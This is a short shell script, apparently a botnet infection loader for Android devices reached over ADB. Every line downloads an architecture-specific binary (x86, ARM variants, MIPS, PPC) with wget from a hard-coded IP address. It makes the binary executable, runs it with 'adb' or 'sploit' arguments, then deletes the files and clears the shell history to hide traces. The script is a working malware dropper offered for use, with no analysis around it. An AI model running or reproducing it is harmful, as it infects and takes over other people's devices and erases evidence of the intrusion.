#!/bin/sh

cd /data/local/tmp; wget http://194.87.84.170/uwu/x86 -O smd; chmod 777 *;./smd adb;rm -rf *;history -w;history -c
cd /data/local/tmp; wget http://194.87.84.170/uwu/arm -O smd; chmod 777 *;./smd sploit;rm -rf *;history -w;history -c
cd /data/local/tmp; wget http://194.87.84.170/uwu/arm5 -O smd; chmod 777 *;./smd sploit;rm -rf *;history -w;history -c
cd /data/local/tmp; wget http://194.87.84.170/uwu/arm6 -O smd; chmod 777 *;./smd sploit;rm -rf *;history -w;history -c
cd /data/local/tmp; wget http://194.87.84.170/uwu/arm7 -O smd; chmod 777 *;./smd sploit;rm -rf *;history -w;history -c
cd /data/local/tmp; wget http://194.87.84.170/uwu/mips -O smd; chmod 777 *;./smd sploit;rm -rf *;history -w;history -c
cd /data/local/tmp; wget http://194.87.84.170/uwu/mpsl -O smd; chmod 777 *;./smd sploit;rm -rf *;history -w;history -c
cd /data/local/tmp; wget http://194.87.84.170/uwu/ppc -O smd; chmod 777 *;./smd sploit;rm -rf *;history -w;history -c
cd /data/local/tmp; wget http://194.87.84.170/uwu/x86 -O smd; chmod 777 *;./smd sploit;rm -rf *;history -w;history -c






